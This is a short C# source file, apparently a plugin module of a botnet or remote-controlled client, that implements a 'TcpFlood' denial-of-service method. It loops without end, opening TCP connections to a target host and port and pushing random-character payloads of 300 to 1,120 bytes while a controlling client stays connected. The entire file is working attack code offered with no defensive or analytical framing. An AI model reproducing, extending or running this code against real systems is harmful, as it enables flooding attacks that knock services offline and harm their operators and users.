using System.Net.Sockets;
using Plugin.Helper;

namespace Plugin.Methods;

internal class TcpFlood : Method
{
	public string Name { get; } = "TcpFlood";


	public void Run(string host, int port)
	{
		while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested)
		{
			try
			{
				Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				socket.Connect(host, port);
				int num = 0;
				int num2 = Randomizer.random.Next(10, 50);
				if (!socket.Connected)
				{
					continue;
				}
				NetworkStream networkStream = new NetworkStream(socket, ownsSocket: true);
				while (Client.itsConnect && !Common.CancellationTokenSource.IsCancellationRequested && socket.Connected)
				{
					try
					{
						byte[] bytes = Common.Encodings[Randomizer.random.Next(Common.Encodings.Length)].GetBytes(Randomizer.getRandomCharacters(Randomizer.random.Next(300, 1120)));
						socket.Poll(-1, SelectMode.SelectWrite);
						networkStream.Write(bytes, 0, bytes.Length);
						networkStream.Flush();
						num++;
						if (num2 > 20)
						{
							break;
						}
					}
					catch
					{
						break;
					}
				}
				networkStream?.Dispose();
				socket?.Dispose();
			}
			catch
			{
			}
		}
	}
}
